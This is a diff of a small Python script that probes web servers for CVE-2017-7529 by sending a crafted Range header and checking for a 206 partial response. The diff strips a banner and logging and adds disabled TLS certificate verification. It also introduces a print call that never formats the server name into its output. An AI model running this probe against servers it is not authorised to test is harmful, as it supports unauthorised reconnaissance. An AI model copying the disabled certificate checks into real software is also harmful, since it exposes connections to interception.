@@ -6,39 +6,21 @@
 # https://github.com/SouravSec
 # Instagram: @itninja.official
 
-# colours
-red = '\033[1;31m'
-ENDC = '\033[0m'
-
-print ('''%s   _|_|_|                                          _|                      
- _|          _|_|_|    _|_|_|  _|_|_|      _|_|_|      _|_|_|    _|    _|  
-   _|_|    _|        _|    _|  _|    _|  _|    _|  _|  _|    _|    _|_|    
-       _|  _|        _|    _|  _|    _|  _|    _|  _|  _|    _|  _|    _|  
- _|_|_|      _|_|_|    _|_|_|  _|    _|    _|_|_|  _|  _|    _|  _|    _|  
-                                               _|                          
-  - https://github.com/SouravSec             _|_|        ::Happy Hunting''' % red)
-print ('''%s ''' % ENDC)                                            
-
-# finish banner 
 import requests
-import logging
 import sys
-
-
-logging.basicConfig(level=logging.INFO)
-log = logging.getLogger(__name__)
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
 def send_http_request(url, headers={}, timeout=8.0):
-    httpResponse   = requests.get(url, headers=headers, timeout=timeout)
+    httpResponse   = requests.get(url, headers=headers, timeout=timeout, verify=False)
     httpHeaders    = httpResponse.headers
 
-    log.info("status: %s: Server: %s", httpResponse.status_code, httpHeaders.get('Server', ''))
+    print("Server: %s", httpHeaders.get('Server', ''))
     return httpResponse
 
 
 def exploit(url):
-    log.info("target: %s", url)
     httpResponse   = send_http_request(url)
 
     content_length = httpResponse.headers.get('Content-Length', 0)
@@ -47,9 +29,9 @@ def exploit(url):
 
     httpResponse   = send_http_request(url, headers={ 'Range': content_length })
     if httpResponse.status_code == 206 and "Content-Range" in httpResponse.text:
-        log.info("[+] Vulnerable to CVE-2017-7529")
+        print("Vulnerable to CVE-2017-7529")
     else:
-        log.info("[?] Unknown Vulnerable")
+        print("No Vulnerable")
 
 
 if __name__ == '__main__':
